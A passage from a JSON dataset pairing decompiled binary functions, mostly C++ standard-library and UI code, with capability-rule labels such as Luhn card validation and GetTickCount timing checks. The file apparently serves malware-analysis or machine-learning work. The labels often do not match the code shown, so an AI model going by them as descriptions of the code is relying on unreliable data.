= 0;\n            puVar1[4] = 7;\n            *(puVar1 + 1) = 0;\n            puVar1[7] = 0;\n            puVar1[8] = 7;\n            *(puVar1 + 5) = 0;\n            puVar1[0xb] = 0;\n            puVar1[0xc] = 7;\n            *(puVar1 + 9) = 0;\n            arg3 = arg3 + -1;\n            puVar1 = puVar1 + 0x14;\n        } while (arg3 != 0);\n    }\n    return arg2;\n}\n",
        "token_count": 479
    },
    "18002f93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18002f930(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    ulong *arg2_00;\n    uint *puVar6;\n    ulong uVar7;\n    int64_t arg1_00;\n    uchar auStack192 [8];\n    int64_t iStack184;\n    uchar uStack176;\n    int64_t iStack168;\n    uchar uStack160;\n    int64_t iStack152;\n    ushort uStack144;\n    int64_t iStack136;\n    ushort uStack128;\n    int64_t iStack120;\n    uchar uStack112;\n    int64_t iStack104;\n    uchar uStack96;\n    ulong uStack88;\n    code **appcStack80 [2];\n    int64_t aiStack64 [3];\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar5 = fcn.18008fb2c(0x20);\n        appcStack80[0] = ppcVar5;\n        arg2_00 = fcn.180002500(arg2, aiStack64);\n        if (0xf < arg2_00[3]) {\n            arg2_00 = *arg2_00;\n        }\n        fcn.18006da30(auStack192, 0);\n        iStack184 = 0;\n        uStack176 = 0;\n        iStack168 = 0;\n        uStack160 = 0;\n        iStack152 = 0;\n        uStack144 = 0;\n        iStack136 = 0;\n        uStack128 = 0;\n        iStack120 = 0;\n        uStack112 = 0;\n        iStack104 = 0;\n        uStack96 = 0;\n        if (arg2_00 == NULL) {\ncode_r0x00018002faf6:\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar1 = swi(3);\n            uVar7 = (*pcVar1)();\n            return uVar7;\n        }\n        fcn.180073c8c(auStack192, arg2_00);\n        *(ppcVar5 + 1) = 0;\n        *ppcVar5 = vtable.std::collate_char_.0;\n        puVar6 = fcn.18007436c(appcStack80);\n        uVar2 = puVar6[1];\n        uVar3 = puVar6[2];\n        uVar4 = puVar6[3];\n        *(ppcVar5 + 2) = *puVar6;\n        *(ppcVar5 + 0x14) = uVar2;\n        *(ppcVar5 + 3) = uVar3;\n        *(ppcVar5 + 0x1c) = uVar4;\n        *arg1 = ppcVar5;\n        fcn.180073cf8(auStack192);\n        if (iStack104 != 0) {\n            fcn.1800b2bb8(iStack104);\n        }\n        iStack104 = 0;\n        if (iStack120 != 0) {\n            fcn.1800b2bb8(iStack120);\n        }\n        iStack120 = 0;\n        if (iStack136 != 0) {\n            fcn.1800b2bb8(iStack136);\n        }\n        iStack136 = 0;\n        if (iStack152 != 0) {\n            fcn.1800b2bb8(iStack152);\n        }\n        iStack152 = 0;\n        if (iStack168 != 0) {\n            fcn.1800b2bb8(iStack168);\n        }\n        iStack168 = 0;\n        if (iStack184 != 0) {\n            fcn.1800b2bb8(iStack184);\n        }\n        iStack184 = 0;\n        fcn.18006dab0(auStack192);\n        if (0xf < uStack40) {\n            arg1_00 = aiStack64[0];\n            if (0xfff < uStack40 + 1) {\n                arg1_00 = *(aiStack64[0] + -8);\n                if (0x1f < (aiStack64[0] - arg1_00) - 8U) {\n                    fcn.1800b3528(arg1_00, uStack40 + 0x28);\n                    goto code_r0x00018002faf6;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1049
    },
    "180032e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180032e50(int64_t arg1)\n\n{\n    uchar (*arg2) [16];\n    int64_t iVar1;\n    uint8_t in_DL;\n    uchar auStack72 [32];\n    ulong uStack40;\n    uchar (*pauStack32) [16];\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack72;\n    arg2 = fcn.18008fb2c(0x28);\n    *arg2 = ZEXT816(0);\n    arg2[1] = ZEXT816(0);\n    *(*arg2 + 8) = in_DL + 10;\n    *(*arg2 + 0xc) = 0;\n    *arg2[1] = 0;\n    *(arg2[1] + 8) = 0;\n    **arg2 = vtable.std::_Node_assert.0;\n    *arg2[2] = 0;\n    pauStack32 = arg2;\n    pauStack32 = fcn.18008fb2c(0x20);\n    *pauStack32 = ZEXT816(0);\n    pauStack32[1] = ZEXT816(0);\n    **pauStack32 = vtable.std::_Node_base.0;\n    *(*pauStack32 + 8) = 1;\n    *pauStack32[1] = 0;\n    *(pauStack32[1] + 8) = 0;\n    *(arg2[1] + 8) = *(arg1 + 0x48);\n    iVar1 = *(arg1 + 0x48);\n    if (*(iVar1 + 0x10) != 0) {\n        *arg2[1] = *(iVar1 + 0x10);\n        *(*(*(arg1 + 0x48) + 0x10) + 0x18) = arg2;\n        iVar1 = *(arg1 + 0x48);\n    }\n    *(iVar1 + 0x10) = arg2;\n    *arg2[2] = pauStack32;\n    *(pauStack32[1] + 8) = arg2;\n    *(arg1 + 0x48) = pauStack32;\n    fcn.180030320(arg1);\n    fcn.180015670(arg1 + 0x40, arg2);\n    *(arg1 + 0x48) = arg2;\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 562
    },
    "180032f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180032f70(int64_t arg1)\n\n{\n    uchar (*pauVar1) [16];\n    int64_t iVar2;\n    \n    pauVar1 = fcn.18008fb2c(0x50);\n    *pauVar1 = ZEXT816(0);\n    pauVar1[1] = ZEXT816(0);\n    pauVar1[2] = ZEXT816(0);\n    pauVar1[3] = ZEXT816(0);\n    pauVar1[4] = ZEXT816(0);\n    *(pauVar1[1] + 8) = 0;\n    *(*pauVar1 + 8) = 7;\n    *pauVar1[1] = 0;\n    **pauVar1 = vtable.std::_Node_class_char__class_std::regex_traits_char__.0;\n    *pauVar1[2] = 0;\n    *(pauVar1[2] + 8) = 0;\n    *pauVar1[3] = 0;\n    *(pauVar1[3] + 8) = 0;\n    *pauVar1[4] = 0;\n    *(pauVar1[4] + 8) = 0;\n    *(pauVar1[1] + 8) = *(arg1 + 8);\n    iVar2 = *(arg1 + 8);\n    if (*(iVar2 + 0x10) != 0) {\n        *pauVar1[1] = *(iVar2 + 0x10);\n        *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar1;\n        iVar2 = *(arg1 + 8);\n    }\n    *(iVar2 + 0x10) = pauVar1;\n    *(arg1 + 8) = pauVar1;\n    return;\n}\n",
        "token_count": 418
    },
    "18003390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.180033900(char *arg1, char *arg2, char *arg3, char *arg4)\n\n{\n    char cVar1;\n    char cVar2;\n    char *pcVar3;\n    bool bVar4;\n    int64_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    \n    pcVar3 = arg1;\n    if ((in_stack_00000030 >> 8 & 1) == 0) {\n        if ((in_stack_00000030 >> 0xb & 1) == 0) {\n            if (arg1 != arg2) {\n                do {\n                    bVar4 = arg3 == arg4;\n                    if (bVar4) goto code_r0x000180033a02;\n                    cVar1 = *arg3;\n                    arg3 = arg3 + 1;\n                    cVar2 = *pcVar3;\n                    pcVar3 = pcVar3 + 1;\n                    if (cVar2 != cVar1) {\n                        return arg1;\n                    }\n                } while (pcVar3 != arg2);\n            }\n            bVar4 = arg3 == arg4;\ncode_r0x000180033a02:\n            if (!bVar4) {\n                return arg1;\n            }\n            return pcVar3;\n        }\n        if (arg1 != arg2) {\n            while (bVar4 = arg3 == arg4,  !bVar4) {\n                arg3 = arg3 + 1;\n                pcVar3 = pcVar3 + 1;\n                cVar1 = fcn.1800323a0(in_stack_00000028);\n                cVar2 = fcn.1800323a0(in_stack_00000028);\n                if (cVar1 != cVar2) {\n                    return arg1;\n                }\n                if (pcVar3 == arg2) {\n                    if (arg3 != arg4) {\n                        return arg1;\n                    }\n                    return pcVar3;\n                }\n            }\n            goto code_r0x000180033980;\n        }\n    }\n    else if (arg1 != arg2) {\n        do {\n            bVar4 = arg3 == arg4;\n            if (bVar4) goto code_r0x000180033980;\n            cVar1 = *arg3;\n            arg3 = arg3 + 1;\n            pcVar3 = pcVar3 + 1;\n            cVar1 = (**(**(in_stack_00000028 + 8) + 0x20))(*(in_stack_00000028 + 8), cVar1);\n            cVar2 = (**(**(in_stack_00000028 + 8) + 0x20))();\n            if (cVar2 != cVar1) {\n                return arg1;\n            }\n        } while (pcVar3 != arg2);\n    }\n    bVar4 = arg3 == arg4;\ncode_r0x000180033980:\n    if (bVar4) {\n        arg1 = pcVar3;\n    }\n    return arg1;\n}\n",
        "token_count": 665
    },
    "1800340d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800340d0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    uchar in_DL;\n    \n    if ((*(arg1 + 0x10) & 0x100) != 0) {\n        in_DL = (**(**(*(arg1 + 0x18) + 8) + 0x20))();\n    }\n    iVar5 = *(arg1 + 8);\n    puVar4 = *(iVar5 + 0x30);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.18008fb2c(0x10);\n        *puVar4 = 0;\n        puVar4[1] = 0;\n        *(iVar5 + 0x30) = puVar4;\n    }\n    uVar3 = *(puVar4 + 4);\n    if (*puVar4 < uVar3 || *puVar4 == uVar3) {\n        uVar1 = uVar3 + 0x10;\n        iVar5 = fcn.1800b15d0(puVar4[1], uVar1);\n        if (iVar5 == 0) {\n            fcn.18006df20();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        puVar4[1] = iVar5;\n        uVar3 = *(puVar4 + 4);\n        *puVar4 = uVar1;\n    }\n    *(uVar3 + puVar4[1]) = in_DL;\n    *(puVar4 + 4) = *(puVar4 + 4) + 1;\n    return;\n}\n",
        "token_count": 391
    },
    "1800349a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1800349a0(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    char cVar1;\n    char cVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    char in_R9B;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint64_t uVar7;\n    \n    uVar5 = 0;\n    uVar7 = uVar5;\n    if (*0x1800ff580 != 0) {\n        uVar3 = uVar5;\n        do {\n            if (arg3 - arg2 == *(uVar3 + 0x1800ff590)) {\n                puVar6 = *(uVar3 + 0x1800ff580);\n                iVar4 = arg2;\n                if (arg2 == arg3) break;\n                while( true ) {\n                    cVar1 = (**(**(arg1 + 8) + 0x20))(*(arg1 + 8), *puVar6);\n                    cVar2 = (**(**(arg1 + 8) + 0x20))();\n                    if (cVar2 != cVar1) break;\n                    iVar4 = iVar4 + 1;\n                    puVar6 = puVar6 + 1;\n                    if (iVar4 == arg3) goto code_r0x000180034a76;\n                }\n            }\n            uVar7 = uVar7 + 1;\n            uVar3 = uVar7 * 0x18;\n        } while (*(uVar3 + 0x1800ff580) != 0);\n    }\ncode_r0x000180034a76:\n    if (*(uVar7 * 0x18 + 0x1800ff580) != 0) {\n        uVar5 = *(uVar7 * 0x18 + 0x1800ff594);\n    }\n    if ((in_R9B != '\\0') && ((uVar5 & 3) != 0)) {\n        uVar5 = uVar5 | 3;\n    }\n    return uVar5;\n}\n",
        "token_count": 463
    },
    "1800352d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800352d0(ulong noname_0, uchar *arg2, uchar *arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    uint32_t **in_stack_00000028;\n    \n    puVar6 = *in_stack_00000028;\n    if (puVar6 != NULL) {\n        do {\n            if (*puVar6 <= arg4) break;\n            in_stack_00000028 = puVar6 + 6;\n            puVar6 = *(puVar6 + 6);\n        } while (puVar6 != NULL);\n        if ((puVar6 != NULL) && (arg4 == *puVar6)) goto code_r0x000180035348;\n    }\n    puVar4 = fcn.18008fb2c(0x20);\n    *puVar4 = arg4;\n    *(puVar4 + 2) = 0;\n    *(puVar4 + 4) = 0;\n    *in_stack_00000028 = puVar4;\n    *(puVar4 + 6) = puVar6;\n    puVar6 = *in_stack_00000028;\ncode_r0x000180035348:\n    if (arg2 != arg3) {\n        uVar3 = puVar6[3];\n        do {\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            if (puVar6[2] < uVar3 || puVar6[2] == uVar3) {\n                iVar5 = fcn.1800b15d0(*(puVar6 + 4), uVar3 + 0x10);\n                if (iVar5 == 0) {\n                    fcn.18006df20();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                *(puVar6 + 4) = iVar5;\n                puVar6[2] = uVar3 + 0x10;\n            }\n            *(puVar6[3] + *(puVar6 + 4)) = uVar1;\n            puVar6[3] = puVar6[3] + 1;\n            uVar3 = puVar6[3];\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 538
    },
    "1800353b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800353b0(int64_t **arg1, uchar *arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t arg1_00;\n    uint64_t uVar4;\n    uchar auStack200 [32];\n    uint uStack168;\n    ulong uStack160;\n    uchar *puStack152;\n    int64_t aiStack144 [3];\n    uint64_t uStack120;\n    uchar auStack112 [16];\n    int64_t iStack96;\n    uint64_t uStack88;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack200;\n    iVar2 = 0;\n    *(arg2 + 0x10) = 0;\n    *(arg2 + 0x18) = 0xf;\n    *arg2 = 0;\n    uStack168 = 1;\n    puStack152 = arg2;\n    if (arg3 != arg4) {\n        auStack112 = ZEXT816(0);\n        iStack96 = 0;\n        uVar4 = arg4 - arg3;\n        if (uVar4 == 0) {\n            auStack112._0_8_ = 0;\n        }\n        else {\n            if (0x7fffffffffffffff < uVar4) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            if (uVar4 < 0x1000) {\n                uVar3 = fcn.18008fb2c(uVar4);\n            }\n            else {\n                uVar3 = uVar4 + 0x27;\n                if (uVar3 <= uVar4) {\n                    uVar3 = 0xffffffffffffffff;\n                }\n                iVar2 = fcn.18008fb2c(uVar3);\n                if (iVar2 == 0) goto code_r0x000180035578;\n                uVar3 = iVar2 + 0x27U & 0xffffffffffffffe0;\n                *(uVar3 - 8) = iVar2;\n            }\n            auStack112 = CONCAT88(auStack112._8_8_, uVar3);\n            iVar2 = uVar3 + uVar4;\n            iStack96 = iVar2;\n            fcn.1800ade80(uVar3, arg3, uVar4);\n            auStack112 = CONCAT88(iVar2, auStack112._0_8_);\n            auStack112._0_8_ = uVar3;\n        }\n        (**(*arg1[1] + 0x18))(arg1[1], auStack112._0_8_, iVar2);\n        (**(**arg1 + 0x20))(*arg1, aiStack144, auStack112._0_8_, iVar2);\n        fcn.18000dd60(arg2, aiStack144);\n        if (0xf < uStack120) {\n            arg1_00 = aiStack144[0];\n            if (0xfff < uStack120 + 1) {\n                arg1_00 = *(aiStack144[0] + -8);\n                if (0x1f < (aiStack144[0] - arg1_00) - 8U) {\n                    fcn.1800b3528(arg1_00, uStack120 + 0x28);\n                    goto code_r0x000180035578;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        if (auStack112._0_8_ != 0) {\n            uVar4 = auStack112._0_8_;\n            if ((0xfff < iVar2 - auStack112._0_8_) &&\n               (uVar4 = *(auStack112._0_8_ - 8),  0x1f < (auStack112._0_8_ - uVar4) - 8)) {\ncode_r0x000180035578:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(uVar4);\n        }\n    }\n    fcn.18008fb00(uStack88 ^ auStack200);\n    return;\n}\n",
        "token_count": 969
    },
    "180036af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180036af0(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint64_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    int64_t *arg1_00;\n    uchar *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    uchar auStack136 [32];\n    ulong uStack104;\n    ulong uStack88;\n    uchar uStack80;\n    unkbyte7 Stack79;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint64_t uStack48;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack136;\n    uVar6 = (**0x1800de798)(*(arg1 + 0x18), arg2 + 0x256d);\n    (**0x1800de7f0)(uVar6, 0x14b, 0, 0);\n    (**0x1800de7f0)(uVar6, 0x143, 0, 0x1800f6554);\n    (**0x1800de7f0)(uVar6, 0x14e, 0, 0);\n    (**0x1800de5b8)(uVar6, 0, 0);\n    uStack64 = *0x180101910;\n    uStack60 = *0x180101914;\n    uStack56 = *0x180101918;\n    uStack52 = *0x18010191c;\n    uStack80 = 0;\n    cVar4 = fcn.1800602c0(0x180124790, &uStack80);\n    uVar3 = CONCAT44(uStack52, uStack56);\n    puVar2 = CONCAT71(Stack79, uStack80);\n    if (cVar4 != '\\0') {\n        arg1_00 = arg1 + 0x58;\n        puVar8 = &uStack80;\n        if (0xf < uVar3) {\n            puVar8 = puVar2;\n        }\n        if (0xf < *(arg1 + 0x70)) {\n            arg1_00 = *arg1_00;\n        }\n        if ((*(arg1 + 0x68) == CONCAT44(uStack60, uStack64)) &&\n           (iVar5 = fcn.1800ae4d0(arg1_00, puVar8, *(arg1 + 0x68)),  iVar5 == 0)) {\n            iVar9 = 0;\n            uStack104 = 0;\n            iVar7 = (**0x1800de730)(*(arg1 + 0x18), arg2 + 0x2559, 0x147, 0);\n            if (iVar7 != 0) {\n                iVar10 = **(arg1 + 0x98);\n                if (((*(arg1 + 0x98))[1] - iVar10) / 0xe8 <= iVar7 - 1U) goto code_r0x000180036d09;\n                iVar10 = (iVar7 - 1U) * 0xe8 + iVar10;\n                for (iVar7 = *(iVar10 + 0xc0) - *(iVar10 + 0xb8) >> 5; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    puVar11 = *(iVar10 + 0xb8) + iVar9;\n                    if (7 < puVar11[3]) {\n                        puVar11 = *puVar11;\n                    }\n                    (**0x1800de7f0)(uVar6, 0x143, 0, puVar11);\n                    iVar9 = iVar9 + 0x20;\n                }\n            }\n        }\n    }\n    if (0xf < uVar3) {\n        puVar8 = puVar2;\n        if ((0xfff < uVar3 + 1) && (puVar8 = *(puVar2 + -8),  0x1f < puVar2 + (-8 - puVar8))) {\n            fcn.1800b3528();\ncode_r0x000180036d09:\n            fcn.18003c1b0();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(puVar8);\n    }\n    fcn.18008fb00(uStack48 ^ auStack136);\n    return;\n}\n",
        "token_count": 1026
    },
    "180036e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180036e80(int64_t arg1, ulong arg2)\n\n{\n    int64_t *arg1_00;\n    uint64_t uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack168 [32];\n    ulong uStack136;\n    uchar auStack128 [8];\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    ushort uStack80;\n    unkbyte6 Stack78;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack40;\n    \n    uStack136 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack168;\n    iVar2 = *(arg1 + 0x34);\n    fcn.18003b930(arg1);\n    arg1_00 = arg1 + 0xb8;\n    iVar5 = *(arg1 + 0xc0);\n    if (*(iVar5 + -0x24) + *(iVar5 + -0x28) + *(iVar5 + -0x10) + *(iVar5 + -0x38) == 0) {\n        fcn.180037040(iVar5 + -0x48);\n        *(arg1 + 0xc0) = *(arg1 + 0xc0) + -0x48;\n    }\n    uStack104 = *0x180101900;\n    uStack100 = *0x180101904;\n    uStack96 = *0x180101908;\n    uStack92 = *0x18010190c;\n    uStack120 = 0;\n    uStack88 = 0;\n    uStack64 = 0;\n    uStack56 = 7;\n    uStack80 = 0;\n    fcn.18003c580(arg1_00, auStack128, *arg1_00 + (arg2 + iVar2 * 10) * 0x48, &uStack120);\n    if (0x1e < (*(arg1 + 0xc0) - *arg1_00) / 0x48) {\n        fcn.18003bf80(arg1_00, 0x1e);\n    }\n    fcn.18003b5c0(arg1, *(arg1 + 0x34));\n    fcn.180036d10(arg1, arg2);\n    if (7 < uStack56) {\n        uVar1 = uStack56 * 2 + 2;\n        iVar4 = CONCAT62(Stack78, uStack80);\n        iVar5 = iVar4;\n        if ((0xfff < uVar1) && (iVar5 = *(iVar4 + -8),  0x1f < (iVar4 - iVar5) - 8U)) goto code_r0x00018003702f;\n        fcn.18008fb24(iVar5);\n    }\n    if (7 < CONCAT44(uStack92, uStack96)) {\n        uVar1 = CONCAT44(uStack92, uStack96) * 2 + 2;\n        iVar4 = CONCAT62(Stack118, uStack120);\n        iVar5 = iVar4;\n        if ((0xfff < uVar1) && (iVar5 = *(iVar4 + -8),  0x1f < (iVar4 - iVar5) - 8U)) {\ncode_r0x00018003702f:\n            fcn.1800b3528(iVar5, uVar1 + 0x27);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18008fb24(iVar5);\n    }\n    fcn.18008fb00(uStack40 ^ auStack168);\n    return;\n}\n",
        "token_count": 854
    },
    "18003704": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180037040(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    if (7 < arg1[8]) {\n        iVar3 = arg1[5];\n        uVar1 = arg1[8] * 2 + 2;\n        iVar4 = iVar3;\n        if (0xfff < uVar1) {\n            iVar4 = *(iVar3 + -8);\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x0001800370f0;\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[8] = 7;\n    arg1[7] = 0;\n    *(arg1 + 5) = 0;\n    if (7 < arg1[3]) {\n        iVar3 = *arg1;\n        uVar1 = arg1[3] * 2 + 2;\n        iVar4 = iVar3;\n        if (0xfff < uVar1) {\n            iVar4 = *(iVar3 + -8);\n            iVar3 = iVar3 - iVar4;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x0001800370f0:\n                fcn.1800b3528(iVar3, uVar1 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 390
    },
    "18003710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180037100(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t arg2_00;\n    uchar auStack120 [32];\n    uint uStack88;\n    uint uStack80;\n    uint uStack72;\n    ulong uStack64;\n    int32_t iStack56;\n    int32_t iStack52;\n    uchar auStack48 [4];\n    int32_t iStack44;\n    int32_t iStack40;\n    uint64_t uStack32;\n    \n    iVar1 = *(arg1 + 0x34);\n    uStack64 = 0x180037129;\n    fcn.18003b930(arg1);\n    iVar4 = *(arg1 + 0xc0);\n    arg2_00 = *(arg1 + 0xb8) + ((arg2 + iVar1 * 10) * 9 + 9) * 8;\n    if (arg2_00 != iVar4) {\n        puVar3 = arg2_00 + -0x24;\n        do {\n            uStack64 = 0x18003715c;\n            fcn.18000d960(puVar3 + -9, arg2_00);\n            puVar3[-1] = puVar3[0x11];\n            *puVar3 = puVar3[0x12];\n            uStack64 = 0x180037174;\n            fcn.18000d960(puVar3 + 1, puVar3 + 0x13);\n            arg2_00 = arg2_00 + 0x48;\n            puVar3 = puVar3 + 0x12;\n        } while (arg2_00 != iVar4);\n        iVar4 = *(arg1 + 0xc0);\n    }\n    uStack64 = 0x180037191;\n    fcn.180037040(iVar4 + -0x48);\n    *(arg1 + 0xc0) = *(arg1 + 0xc0) + -0x48;\n    uStack64 = 0x1800371a4;\n    fcn.18003b5c0(arg1, *(arg1 + 0x34));\n    uStack32 = *0x180123080 ^ &stack0xffffffffffffff88;\n    *(arg1 + 0x30) = arg2;\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), arg2 + 0x25a9);\n    (**0x1800de700)(uVar2, &stack0xffffffffffffffd0);\n    iStack56 = iStack40 + 1;\n    iStack52 = iStack44 + 2;\n    (**0x1800de7e8)(*(arg1 + 0x18), &stack0xffffffffffffffc8);\n    uVar6 = 0;\n    uStack72 = 0x201;\n    uStack80 = 0;\n    uStack88 = 0;\n    (**0x1800de7c8)(*(arg1 + 0xa0), 0, iStack56, iStack52);\n    if ((arg2 < 9) || (uVar5 = 0,  *(arg1 + 0x34) < ((*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 + -1) / 10)) {\n        uVar5 = 1;\n    }\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x2526);\n    (**0x1800de770)(uVar2, uVar5);\n    if ((0 < arg2) || (0 < *(arg1 + 0x34))) {\n        uVar6 = 1;\n    }\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), 0x2527);\n    (**0x1800de770)(uVar2, uVar6);\n    uVar2 = (**0x1800de798)(*(arg1 + 0x18), arg2 + 0x2545);\n    (**0x1800de6f0)(uVar2);\n    fcn.18008fb00(uStack32 ^ &stack0xffffffffffffff88);\n    return;\n}\n",
        "token_count": 979
    },
    "1800371d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1800371d0(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar auStack1192 [32];\n    ulong uStack1160;\n    ushort uStack1144;\n    unkbyte6 Stack1142;\n    uint uStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    int16_t aiStack1112 [264];\n    int16_t aiStack584 [264];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180123080 ^ auStack1192;\n    (**0x1800de728)(*(arg1 + 0x18), arg2 + 0x2545, aiStack1112, 0x104);\n    iVar5 = -1;\n    uStack1128 = *0x180101900;\n    uStack1124 = *0x180101904;\n    uStack1120 = *0x180101908;\n    uStack1116 = *0x18010190c;\n    uStack1144 = 0;\n    iVar6 = -1;\n    do {\n        iVar6 = iVar6 + 1;\n    } while (aiStack1112[iVar6] != 0);\n    fcn.180010d70(&uStack1144, aiStack1112, iVar6);\n    fcn.18000d960(arg3, &uStack1144);\n    if (7 < CONCAT44(uStack1116, uStack1120)) {\n        iVar3 = CONCAT62(Stack1142, uStack1144);\n        uVar1 = CONCAT44(uStack1116, uStack1120) * 2 + 2;\n        iVar6 = iVar3;\n        if ((0xfff < uVar1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) goto code_r0x0001800373ad;\n        fcn.18008fb24(iVar6);\n    }\n    (**0x1800de728)(*(arg1 + 0x18), arg2 + 0x2581, aiStack584, 0x104);\n    uStack1128 = *0x180101900;\n    uStack1124 = *0x180101904;\n    uStack1120 = *0x180101908;\n    uStack1116 = *0x18010190c;\n    uStack1144 = 0;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (aiStack584[iVar5] != 0);\n    fcn.180010d70(&uStack1144, aiStack584, iVar5);\n    fcn.18000d960(arg3 + 0x28, &uStack1144);\n    if (7 < CONCAT44(uStack1116, uStack1120)) {\n        iVar5 = CONCAT62(Stack1142, uStack1144);\n        